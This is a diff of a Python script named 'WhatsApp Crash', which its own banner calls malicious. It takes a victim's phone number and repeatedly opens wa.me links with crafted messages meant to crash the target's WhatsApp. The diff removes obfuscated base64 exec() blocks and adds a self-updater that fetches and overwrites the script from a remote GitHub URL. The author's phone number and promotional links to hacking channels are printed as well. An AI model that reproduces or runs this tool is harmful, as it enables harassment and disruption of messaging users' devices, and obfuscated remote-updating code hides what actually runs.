@@ -1,5 +1,4 @@
 import os
-import base64
 import time as t
 import urllib.parse
 os.system("pip install --upgrade pip")
@@ -26,60 +25,32 @@ colorama.init(autoreset=True)
 os.system("clear")
 print(Fore.RED + "WhatsApp Crash: This tool is meant for malicious purposely only☠️☠️💀\n\nLet\'s act and stay wicked 😠😠😡🤬\n\nWe don\'t forgive and forget 😈😈\n\nLet us crash WhatsApp 😠😡😡😡")
 t.sleep(3)
-SpiderAnongreyhat = ""
-SpiderAnongreyhat += "\x49\x32\x5a\x79\x62\x32\x30\x67\x64\x58"
-SpiderAnongreyhat += "\x42\x6b\x59\x58\x52\x6c\x58\x32\x4e\x6f"
-SpiderAnongreyhat += "\x5a\x57\x4e\x72\x49\x47\x6c\x74\x63\x47"
-SpiderAnongreyhat += "\x39\x79\x64\x43\x42\x70\x63\x31\x56\x77"
-SpiderAnongreyhat += "\x56\x47\x39\x45\x59\x58\x52\x6c\x4c\x43"
-SpiderAnongreyhat += "\x42\x31\x63\x47\x52\x68\x64\x47\x55\x4b"
-SpiderAnongreyhat += "\x49\x32\x6c\x6d\x49\x47\x6c\x7a\x56\x58"
-SpiderAnongreyhat += "\x42\x55\x62\x30\x52\x68\x64\x47\x55\x6f"
-SpiderAnongreyhat += "\x58\x31\x39\x6d\x61\x57\x78\x6c\x58\x31"
-SpiderAnongreyhat += "\x38\x73\x49\x43\x41\x69\x61\x48\x52\x30"
-SpiderAnongreyhat += "\x63\x48\x4d\x36\x4c\x79\x39\x79\x59\x58"
-SpiderAnongreyhat += "\x63\x75\x5a\x32\x6c\x30\x61\x48\x56\x69"
-SpiderAnongreyhat += "\x64\x58\x4e\x6c\x63\x6d\x4e\x76\x62\x6e"
-SpiderAnongreyhat += "\x52\x6c\x62\x6e\x51\x75\x59\x32\x39\x74"
-SpiderAnongreyhat += "\x4c\x33\x4e\x77\x61\x57\x52\x6c\x63\x6a"
-SpiderAnongreyhat += "\x67\x32\x4d\x7a\x59\x30\x4e\x43\x39\x58"
-SpiderAnongreyhat += "\x61\x47\x46\x30\x63\x30\x46\x77\x63\x43"
-SpiderAnongreyhat += "\x31\x44\x63\x6d\x46\x7a\x61\x43\x39\x74"
-SpiderAnongreyhat += "\x59\x57\x6c\x75\x4c\x32\x4e\x79\x59\x58"
-SpiderAnongreyhat += "\x4e\x6f\x4c\x6e\x42\x35\x49\x69\x6b\x67"
-SpiderAnongreyhat += "\x50\x54\x30\x67\x56\x48\x4a\x31\x5a\x54"
-SpiderAnongreyhat += "\x6f\x4b\x49\x43\x41\x67\x49\x43\x4e\x77"
-SpiderAnongreyhat += "\x63\x6d\x6c\x75\x64\x43\x68\x47\x62\x33"
-SpiderAnongreyhat += "\x4a\x6c\x4c\x6c\x6c\x46\x54\x45\x78\x50"
-SpiderAnongreyhat += "\x56\x79\x73\x67\x49\x6c\x52\x6f\x61\x58"
-SpiderAnongreyhat += "\x4d\x67\x64\x6d\x56\x79\x63\x32\x6c\x76"
-SpiderAnongreyhat += "\x62\x69\x42\x70\x63\x79\x42\x76\x64\x58"
-SpiderAnongreyhat += "\x52\x6b\x59\x58\x52\x6c\x5a\x43\x77\x67"
-SpiderAnongreyhat += "\x64\x32\x6c\x73\x62\x43\x42\x31\x63\x47"
-SpiderAnongreyhat += "\x52\x68\x64\x47\x55\x67\x64\x47\x68\x6c"
-SpiderAnongreyhat += "\x49\x48\x52\x76\x62\x32\x77\x67\x61\x57"
-SpiderAnongreyhat += "\x34\x67\x59\x53\x42\x74\x61\x57\x35\x31"
-SpiderAnongreyhat += "\x64\x47\x55\x69\x4b\x51\x3d\x3d"
-exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(SpiderAnongreyhat.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))
-t.sleep(3)
-os.system("clear")
-head = pyfiglet.figlet_format("WhatsApp Crash")
-print(Fore.RED + head)
-print(Fore.YELLOW + "Version 1.3".center(70))
-print(Fore.CYAN + "\nThis tool was created by Spider Anongreyhat\n\nFind me on WhatsApp:+2349052863644👨‍💻👨‍💻\n\n\n")
-print(Fore.GREEN + "😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😈Wickedness Only😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😡☠️\n\n"
+from update_check import isUpToDate, update
+if isUpToDate(__file__,  "https://raw.githubusercontent.com/spider863644/WhatsApp-Crash/main/crash.py") == False:
+    print(Fore.YELLOW+ "This version is outdated, will update the tool in a minute")
+    t.sleep(3)
+    update("crash.py",  "https://raw.githubusercontent.com/spider863644/WhatsApp-Crash/main/crash.py")
+    print(Fore.GREEN + "Updated\nRun tool again")
+    exit()
+def loop():
+    os.system("clear")
+    head = pyfiglet.figlet_format("WhatsApp Crash")
+    print(Fore.RED + head)
+    print(Fore.YELLOW + "Version 1.3".center(70))
+    print(Fore.CYAN + "\nThis tool was created by Spider Anongreyhat\n\nFind me on WhatsApp:+2349052863644👨‍💻👨‍💻\n\n\n")
+    print(Fore.GREEN + "😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😈Wickedness Only😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😡😈😈😈😈😈😡☠️\n\n"
     )
-print(Fore.CYAN + """
+    print(Fore.CYAN + """
 [1] Crash WhatsApp
 [2] Join my telegram channel
 [3] Join our WhatsApp group
 [4] Exit Program
     """)
-try:
+    try:
         menu = int(input(Fore.GREEN + "Enter an option: "))
-except ValueError:
+    except ValueError:
         print(Fore.RED + "Only integer is allowed")
-if menu == 1:
+    if menu == 1:
         header = input(Fore.YELLOW + "Enter message header: ")
         if len(header) > 1000:
             print(Fore.RED + "Header shouldn\'t be greater than 1000 characters[Space included]")
@@ -91,11 +62,7 @@ if menu == 1:
     
         data = urllib.parse.urlencode(crash)
         VictimNumber = input (Fore.RED + " Enter target phone number [Including Country code]: ")
-        if """fvck-sapa = ""
-fvck-sapa += "\x49\x6a\x49\x7a\x4e\x44\x6b\x77\x4e\x54"
-fvck-sapa += "\x49\x34\x4e\x6a\x4d\x32\x4e\x44\x51\x69"
-fvck-sapa += ""
-exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(fvck-sapa.encode("\x75\x74\x66\x2d\x38")).decode("\x75\x74\x66\x2d\x38"))""" in VictimNumber:
+        if "2349052863644" in VictimNumber:
             print(Fore.YELLOW + "You can\'t use my script against me 😂😂😂")
             exit()
         url = "https://wa.me/" + VictimNumber +"?" + data
@@ -111,18 +78,18 @@ exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(fvck-sapa.encode("\x75\x74
           os.system(j)
           t. sleep(15)
         print(Fore.GREEN + "Done sending malicious messages to " + VictimNumber)
-elif menu == 2:
+    elif menu == 2:
         os.system("xdg-open https://t.me/termuxhackz_society")
-elif menu == 3:
+    elif menu == 3:
         os.system("xdg-open https://chat.whatsapp.com/IWqGOsJPjkp2vXcMSJKYns")
-elif menu == 4:
+    elif menu == 4:
         print(Fore.BLUE + "Thanks for using\nKindly follow me on github")
         t.sleep(2)
         os.system("xdg-open https://github.com/spider863644")
-else:
+    else:
         print(Fore.RED + "Invalid option")
-cont = input(Fore.YELLOW + "Do you wanna continue?[y/n]: ").upper().strip()
-if cont == "Y":
+    cont = input(Fore.YELLOW + "Do you wanna continue?[y/n]: ").upper().strip()
+    if cont == "Y":
         loop()
 
 loop()
